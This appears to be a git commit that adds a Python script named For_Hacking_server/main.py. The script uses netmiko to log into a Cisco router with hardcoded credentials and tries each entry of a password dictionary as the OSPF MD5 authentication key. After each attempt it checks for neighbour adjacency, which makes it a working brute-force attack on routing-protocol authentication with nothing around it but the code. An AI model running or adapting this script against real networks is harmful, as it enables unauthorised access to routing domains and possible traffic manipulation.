66caae86fb146934a6f652af3de44077254c9d2c
pajeanbetuto <pajeanbe@gmail.com>
2026-03-30 02:59:55 +0000

    init

---
+++ For_Hacking_server/main.py
@@ -0,0 +1,30 @@
+from netmiko import ConnectHandler
+from pathlib import Path
+
+# Define device details
+cisco_device = {
+    'device_type': 'cisco_ios',
+    'host': '192.168.5.1',
+    'username': 'hacker',
+    'password': 'hacker123@',
+    'secret': 'hacker123@'
+}
+
+
+
+def load_passwords(path):
+    with open(path, "r") as f:
+        return f.read().split("\n")
+
+# Establish connection
+with ConnectHandler(**cisco_device) as net_connect:
+    for ospf_password in load_passwords("password_dictionnaries.txt"):
+        commands = [
+            "interface GigabitEthernet0/0",
+            f'ip ospf message-digest-key 1 md5 {ospf_password}',
+            "ip ospf authentication message-digest"
+        ]
+        output = net_connect.send_config_set(commands)
+        print(output)
+        output = net_connect.send_command('show ip ospf neighb')
+        print(output)
